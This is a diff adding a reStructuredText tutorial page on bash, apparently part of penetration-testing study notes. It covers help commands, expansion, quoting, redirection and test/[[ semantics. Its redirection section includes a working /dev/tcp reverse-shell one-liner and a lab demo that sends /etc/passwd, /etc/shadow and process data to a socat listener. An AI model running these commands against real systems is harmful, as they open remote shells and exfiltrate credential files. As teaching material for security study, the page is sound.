@@ -1,0 +1,617 @@
+.. include:: /pentest_links.txt
+
+
+********
+``bash``
+********
+
+``bash`` references
+===================
+
+First start with the `GNU Bash manual <https://www.gnu.org/software/bash/manual/>`_. We'll be referencing the `HTML with one web page per node <https://www.gnu.org/software/bash/manual/html_node/index.html>`_.
+
+Also worth reviewing is `Greg's Wiki <http://mywiki.wooledge.org/EnglishFrontPage>`_ with the following ``bash`` documentation:
+
+  * `Bash Pitfalls <http://mywiki.wooledge.org/BashPitfalls>`_
+
+  * `Bash Guide <http://mywiki.wooledge.org/BashGuide>`_
+
+  * `Bash Reference Sheet <http://mywiki.wooledge.org/BashSheet>`_
+
+  * `Bash Programming <http://mywiki.wooledge.org/BashProgramming>`_
+
+  * `BASH Frequently Asked Questions <http://mywiki.wooledge.org/BashFAQ>`_, including our favorites:
+
+    * `How do I determine the location of my script? I want to read some config files from the same place <http://mywiki.wooledge.org/BashFAQ/028>`_
+
+    * `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_
+
+    * `What are all the dot-files that bash reads? <http://mywiki.wooledge.org/BashFAQ/039>`_
+
+
+``bash`` commands ``man`` and ``help``
+======================================
+
+
+From the command line you can get some ``bash`` help via:
+
+.. code-block:: bash
+
+  # manual pages
+  man man
+  man apropos  # apropos is short for man -k
+  man -k passwd  # keyword search for passwd in man pages
+  man passwd  # passwd command
+  man 5 passwd  # passwd file format
+  man bash
+
+  # "type" classifies "commands" as:
+  #     builtin's = part of shell, but some also have separate executable
+  #     keywords (not a command)
+  #     separate executable
+  #     alias to executable
+  # [, test, true, and false are builtin's and separate executables
+  type "["
+  which "["
+  type /usr/bin/[
+  type test
+  which test
+  type true
+  which true
+  type false
+  which false
+  # Proving that [ is treated like an executable file
+  I=3; if          [ $I -eq 2 ]; then echo I = 2; else echo I =/= 2; fi; unset I
+  I=3; if /usr/bin/[ $I -eq 2 ]; then echo I = 2; else echo I =/= 2; fi; unset I
+  # [[ is keyword
+  type "[["
+  # executables
+  type ls
+  which ls
+  type grep
+
+
+  # Useful "help" commands
+  help  # list commands built into the shell (not a separate file)
+
+  # Sourcing a file (same process) different than executing file (subprocess)
+  help .
+  help source
+  # Subprocess gets copy of environment so changes not propagated back
+  unset X; X=1; ( echo X=$X; X=2; echo X=$X; exit 255; ); echo RC=$?; echo X=$X; unset X
+  # To group statements without a subshell use {..}
+  help {
+  unset X; X=1; { echo X=$X; X=2; echo X=$X; }; echo X=$X; unset X  # Don't exit in {..}
+
+  # Difference between arithmetic value of ((...)) and return code
+  help \(
+  help let
+  # Return code 0 == true, false o.w. BUT arithmetic value ((0)) is false.
+  # So ((0)) value is 0, but RC is 1.
+  ((0)); echo $?; ((1)); echo $?
+  # Comes in handy for testing if string in file:
+  (( $(grep -c root /etc/passwd) )) && echo "root in /etc/passwd"
+  (( $(grep -c ^^^^ /etc/passwd) )) && echo "^^^^ in /etc/passwd"
+
+
+  # Difference between ((..)) and [..], test .., [[..]]
+  help [
+  help test
+  help [[
+  # ((..)) different from rest with numbers
+  ((0));    echo $?;   ((1));    echo $?
+  [ 0 ];    echo $?;   [ 1 ];    echo $?
+  test 0;   echo $?;   test 1;   echo $?
+  [[ 0 ]];  echo $?;   [[ 1 ]];  echo $?
+  # ((..)) different from rest with strings
+  ((""));    echo $?;   (("A"));    echo $?
+  [ "" ];    echo $?;   [ "A" ];    echo $?
+  test "";   echo $?;   test "A";   echo $?
+  [[ "" ]];  echo $?;   [[ "A" ]];  echo $?
+
+
+  # eval gets double substitution
+  help eval
+  X=\$Y; X=$'$Y'; Y=1; echo $X; eval echo $X; unset X Y
+
+
+  # true, false only valid in certain contexts
+  help :
+  help false
+  help true
+  # This works
+  if true;  then echo true; else echo false; fi
+  if false; then echo true; else echo false; fi
+  # But these don't
+  if test true  ; then echo true; else echo false; fi
+  if test false ; then echo true; else echo false; fi
+  if [ true    ]; then echo true; else echo false; fi
+  if [ false   ]; then echo true; else echo false; fi
+  if [[ true  ]]; then echo true; else echo false; fi
+  if [[ false ]]; then echo true; else echo false; fi
+  [[ true  ]] &&  echo true;
+  [[ false ]] &&  echo true;
+
+
+  help shopt
+  help trap
+
+  help set
+  help unset
+  help umask
+  help function
+  help exit
+  help return
+  help shift
+
+
+  help printf
+  # Trick to repeat strings - format with 0 characters output "%.0s"
+  LENGTH100=$(printf "0123456789%.0s" {0..9})
+  echo ${#LENGTH100}
+  # As seen by ...
+  echo "0123456789%.0s" {0..9}
+  # The above is short for
+  LENGTH100=$(printf "0123456789%.0s" 0 1 2 3 4 5 6 7 8 9)
+  echo ${#LENGTH100}
+  # If the amount output changed to 1
+  LENGTH110=$(printf "0123456789%.1s" A B C D E F G H I J)
+  echo ${#LENGTH110}
+  unset LENGTH100 LENGTH110
+
+
+  help variables
+
+
+  help case
+  help if
+  help for
+  help select
+  help until
+  help while
+  help break
+  help continue
+
+
+``bash`` concepts
+=================
+
+
+Expansion
+---------
+
+From ``man bash``:
+
+  Expansion is performed on the command line after it has been split into words. There are seven kinds of expansion performed: brace expansion, tilde expansion, parameter and variable  expansion,  command  substitution, arithmetic expansion, word splitting, and pathname expansion.
+  ...
+  After these expansions are performed, quote characters present in the original word are removed  unless  they  have  been  quoted  themselves (quote removal).
+
+  Only brace expansion, word splitting, and pathname expansion can change the number of words of the expansion; other expansions expand a single word to a single word. The only exceptions to this are the expansions of "$@" and "${name[@]}" as explained above (see PARAMETERS).
+
+
+Here are some examples of each type of expansion:
+
+.. code-block:: bash
+
+  # brace expansion
+  echo {0..9..2}
+  echo ls /usr/{bin,share,src}/{gdb,*passwd*}
+
+  # tilde expansion
+  echo ls ~
+  echo ls ~hacker
+  echo ls ~DELETEME
+
+  # parameter expansion
+  X="a rather longish string with garbage at end"
+  echo ${X% with garbage*}
+  unset X
+
+  # command substitution
+  echo echo $(grep -c root /etc/passwd)
+  echo echo `grep -c root /etc/passwd`
+
+  # arithmetic expansion
+  echo echo $((  1+7 /3 ))
+  echo echo $(( (1+7)/3 ))
+  echo echo $(( 1+(7/3) ))
+
+  # process substitution
+  echo grep host <(cat /etc/host*)
+  # If you're confused about what's going on, run these commands
+  ls /etc/host*
+  grep host <(cat /etc/host*)
+  cat /etc/host*
+
+  # word splitting
+  count() { echo $#; }
+  count a b c
+  count 'a b c'
+  Z="a b c"
+  count $Z
+  count "$Z"
+
+  # pathname expansion
+  ls /etc/host*
+
+
+Arguments and Quotes
+--------------------
+
+For information about how the ``IFS`` variable affects word splitting see `Arguments <http://mywiki.wooledge.org/Arguments>`_.
+
+See `Quotes <http://mywiki.wooledge.org/Quotes>`_ to understand how quoting can affect word splitting. The main takeway for quotes is is to avoid ``cp $file $destination  # WRONG`` and use ``cp -- "$file" "$destination"  # Right``:
+
+.. code-block:: bash
+
+  # Create file name starting with -- and having an embedded newline
+  file="--a 
+  file"
+  touch -- "$file"
+  ls
+  ls | xxd
+  # Now copy to another unusual but legal filename
+  destination="--another file"
+  cp $file $destination         # WRONG
+  cp -- "$file" "$destination"  # Right
+  ls
+  rm -- --*
+  ls
+
+
+This Quotes example is important:
+
+.. code-block:: bash
+
+  # Never use an unquoted $@ or $*.
+  (
+  # 3 arguments, not 6
+  set 'a' 'b c' "'d e' f"
+  echo ============
+  # Do this
+  for file in "$@"; do
+    echo filename = $file
+  done
+  echo ============
+  # But not this
+  for file in "$*"; do
+    echo filename = $file
+  done
+  echo ============
+  # Nor this
+  for file in $@; do
+    echo filename = $file
+  done
+  echo ============
+  # Nor this
+  for file in $*; do
+    echo filename = $file
+  done
+  echo ============
+  )
+
+
+Pattern Matching
+----------------
+
+`Pattern Matching <https://www.gnu.org/software/bash/manual/html_node/Pattern-Matching.html#Pattern-Matching>`_ is more nuanced that it first appears and character ranges are dependent on ``locale``:
+
+.. code-block:: bash
+
+  # Show your locale first
+  locale
+  # Now display upper/lower case files
+  touch a A b B c C
+  ls [a-c]*
+  ls [A-C]*
+  ls [a-C]*
+  ls [A-c]*
+  ls [a-B]*
+  ls [A-B]*
+  ls [A-b]*
+  (
+  # Collation order is A-Z, a-z
+  export LC_COLLATE=C
+  ls [a-c]*
+  ls [A-C]*
+  ls [a-C]*
+  ls [A-c]*
+  ls [a-B]*
+  ls [A-B]*
+  ls [A-b]*
+  )
+
+  rm -f a b c A B C
+
+
+Redirection
+-----------
+
+STDIN, STDOUT, and STDERR (0, 1, 2) can be redirected (see `Redirections <https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirections>`_). Additional fd's can be created and redirected to various locations including ``/dev/tcp``.
+
+
+Here Documents
+^^^^^^^^^^^^^^
+
+See `Here Documents <https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Here-Documents>`_ for a short introduction to here-documents.
+
+A typical use we've made involves creating files in scripts, using "EOF" with quotes to avoid expansion (usually $variable expansion):
+
+.. code-block:: bash
+
+  cat > sample.sh <<"EOF"
+  #!/usr/bin/env bash
+
+  X=1
+  echo $X
+  EOF
+  chmod +x sample.sh
+  ./sample.sh
+  rm -f sample.sh
+
+`Here Strings <https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Here-Strings>`_ are related but redirect strings:
+
+.. code-block:: bash
+
+  # Reproduce here-document above with string - note single quote ', " won't work
+  cat > sample.sh <<<'#!/usr/bin/env bash
+
+  X=1
+  echo $X
+  '
+  chmod +x sample.sh
+  ./sample.sh
+  rm -f sample.sh
+
+
+Redirection to ``/dev/tcp`` using ``/proc/self/fd/9``
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Use ``exec`` to add fd 9 which is redirected to ``/dev/tcp/www.example.com/80``:
+
+.. code-block:: bash
+
+  (
+  exec 9<>/dev/tcp/www.example.com/80  # open tcp port 80 to/from www.example.com
+  ls -l /proc/self/fd/  # show newly created fd
+  ss -n dst $(dig +short www.example.com)  # show newly created tcp connection
+  # Make a web request
+  echo -ne "HEAD / HTTP/1.1\r\nhost: www.example.com\r\nConnection: close\r\n\r\n" >&9
+  # Get the response
+  cat <&9
+  )
+
+
+Redirection to remote bash shell
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Although there are better ways to get a remote shell, if you have limited software on the attacked machine you can always use ``dev/tcp``:
+
+.. code-block:: bash
+
+  ############
+  # Terminal 1, the listener on port 6666 waiting for a bash shell
+  LISTENON=localhost
+  PORT=6666
+  socat TCP-LISTEN:$PORT,bind="$LISTENON" -
+  ############
+
+
+  ############
+  # Terminal 2, start up bash shell for remote exploitation
+  EXPLOITER=localhost
+  PORT=6666
+  ( bash -i >&/dev/tcp/$EXPLOITER/$PORT 0<&1; )
+  ############
+
+  ############
+  # Terminal 1, run bash shell commands and eventually terminate
+  hostname
+  whoami
+  exit
+  ############
+
+
+Redirection to exfiltrate data
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Here we have a little fun by running 2 terminal sessions on the same host simulating exfiltrating data using redirection. This example is interesting for 2 reasons: (1) redirection is to the TCP socket ``/dev/tcp/4444``, and (2) a whole sequence of commands is redirected:
+
+.. code-block:: bash
+
+  ############
+  # Terminal 1, the listener on port 4444, output to host-session_*
+  LISTENON=localhost
+  PORT=4444
+  FILENAME="host-session_$(date +'%F_%H%M%S').txt"
+  socat -u TCP-LISTEN:$PORT,bind="$LISTENON",fork,reuseaddr OPEN:"$FILENAME",creat,append
+  ############
+
+
+  ############
+  # Terminal 2, exfiltrate data to listener
+  # Since on the same host, show listener
+  sudo ss -tnlp
+  # Exfiltrate data
+  EXFILTRATE=localhost
+  PORT=4444
+  {
+  echo "# dump /etc/passwd"
+  cat /etc/passwd
+  echo "# dump /etc/shadow"
+  cat /etc/shadow
+  echo "# ps -ef"
+  ps -ef
+  echo "# lastlog"
+  lastlog
+  } 1>/dev/tcp/$EXFILTRATE/$PORT 2>&1
+  ############
+
+  ############
+  # Terminal 1, stop the listener and get data
+  <control-C>
+  ls -l "$FILENAME"
+  rm -f "$FILENAME"
+  ############
+
+
+What is the difference between test, [ and [[ ?
+-----------------------------------------------
+
+
+This section is based on `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_:
+
+  The theory behind all of this is that [ is a simple command, whereas [[ is a compound command. [ receives its arguments as any other command would, but most compound commands introduce a special parsing context which is performed before any other processing. Typically this step looks for special reserved words or control operators specific to each compound command which split it into parts or affect control-flow. The Bash test expression's logical and/or operators can short-circuit because they are special in this way (as are e.g. ;;, elif, and else). Contrast with ArithmeticExpression, where all expansions are performed left-to-right in the usual way, with the resulting string being subject to interpretation as arithmetic.
+
+
+Commands vs keywords
+^^^^^^^^^^^^^^^^^^^^
+
+Let's look at this. First, ``[`` and ``test`` are shell builtin's while [[ and (( are keywords:
+
+.. code-block:: bash
+
+  # 2 builtins
+  type "["
+  type "test"
+  # 1 keyword
+  type "[["
+  # keyword but errors out
+  type "(("
+
+
+The canary: $(echo something 1>&2)
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+To illustrate the difference, `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_ uses a canary:
+
+.. code-block:: bash
+
+  $(echo "This doesn't do what you think..." >&2)
+
+The idea is that this code will display something (a noticeable side effect) without affecting STDOUT (so the ``bash`` line isn't affected).
+
+Placed in key places it illustrates when keywords affect order of execution/expansion.
+
+((
+^^
+
+From `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_:
+
+  The arithmetic compound command has no special operators. It has only one evaluation context - a single arithmetic expression. Arithmetic expressions have operators too, some of which affect control flow during the arithmetic evaluation step (which happens last).
+
+Consider the following statement:
+
+.. code-block:: bash
+
+  (( 1 + 1 == 2 ? 1 : $(echo "This doesn't do what you think..." >&2; echo 1) ))
+
+The arithmetic evaluation happens **last**, meaning the canary is execute. Here's what happens:
+
+.. code-block:: bash
+
+  (( 1 + 1 == 2 ? 1 : $(echo "This doesn't do what you think..." >&2; echo 1) ))
+
+  # The ternary expression "EXP ? EXP1 : EXP2" is not evaluated first
+  # Instead, $(..) is expanded ...
+  #   So "This doesn't do what you think..." is output to STDERR.
+  #   Then "echo 1" replaces $(..) and we're left with
+  (( 1 + 1 == 2 ? 1 : 1 ))
+  # Then the arithmetic can be evaluated:
+  #  "1 + 1 == 2" is true, so "? 1 :" returns 1 as the value.
+  #  The corresponding RC ($?) is set to 0.
+
+You can see this by trying these modifications:
+
+.. code-block:: bash
+
+  (( 1 + 1 == 2 ? 1 : $(echo "This doesn't do what you think..." >&2; echo 1) ))
+  echo $?
+  (( 1 + 1 == 2 ? 0 : $(echo "This doesn't do what you think..." >&2; echo 1) ))
+  echo $?
+  (( 1 + 2 == 2 ? 0 : $(echo "This doesn't do what you think..." >&2; echo 1) ))
+  echo $?
+  (( 1 + 2 == 2 ? 1 : $(echo "This doesn't do what you think..." >&2; echo 0) ))
+  echo $?
+
+
+[[
+^^
+
+From `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_:
+
+  [ receives its arguments as any other command would, but most compound commands introduce a special parsing context which is performed before any other processing. Typically this step looks for special reserved words or control operators specific to each compound command which split it into parts or affect control-flow.
+
+It provides this example which we extend:
+
+.. code-block:: bash
+
+  [[ '1 + 1' -eq 2 && $(echo "...but this probably does what you expect." >&2) ]]
+  # Change to or || to show $(echo ...) not executed
+  [[ '1 + 1' -eq 2 || $(echo "...but this probably does what you expect." >&2) ]]
+
+
+``test`` and ``[``
+^^^^^^^^^^^^^^^^^^
+
+From `What is the difference between test, [ and [[ ? <http://mywiki.wooledge.org/BashFAQ/031>`_:
+
+  ``test`` and ``[`` are commands and they both receive "arguments as any other command would.
+
+  ...
+
+  The Bash test expression's logical and/or operators can short-circuit because they are special in this way (as are e.g. ;;, elif, and else).
+
+
+It provides this (slightly modified) example:
+
+.. code-block:: bash
+
+  # [ is a command, not a keyword
+  [ $((1 + 1)) -eq 2 -o $(echo 'No short-circuit' >&2;) ]
+
+Again, we modify the command to illustrate what is happening:
+
+.. code-block:: bash
+
+  # test same as [
+  test $((1 + 1)) -eq 2 -o $(echo 'No short-circuit' >&2;)
+  # Get rid of error with extra echo ""
+  test $((1 + 1)) -eq 2 -o $(echo 'No short-circuit' >&2; echo "word";)
+  # Change first test to false
+  test $((1 + 1)) -eq 3 -o $(echo 'No short-circuit' >&2; echo "word")
+
+
+Functions
+---------
+
+See `Shell functions <https://www.gnu.org/software/bash/manual/html_node/Shell-Functions.html#Shell-Functions>`_ for a short introduction to functions.
+
+Functions are defined in 1 of 2 ways: ``name () compound-command [ redirections ]`` or ``function name [()] compound-command [ redirections ]``.
+
+Here is an example from TLDP `Examples of functions in scripts <http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_11_02.html>`_:
+
+.. code-block:: bash
+
+  pathmunge () {
+          if ! echo $PATH | /bin/egrep -q "(^|:)$1($|:)" ; then
+             if [ "$2" = "after" ] ; then
+                PATH=$PATH:$1
+             else
+                PATH=$1:$PATH
+             fi
+          fi
+  }
+
+  # Path manipulation
+  if [ `id -u` = 0 ]; then
+          pathmunge /sbin
+          pathmunge /usr/sbin
+          pathmunge /usr/local/sbin
+  fi
+
+  pathmunge /usr/X11R6/bin after
+
+  unset pathmunge
+
+
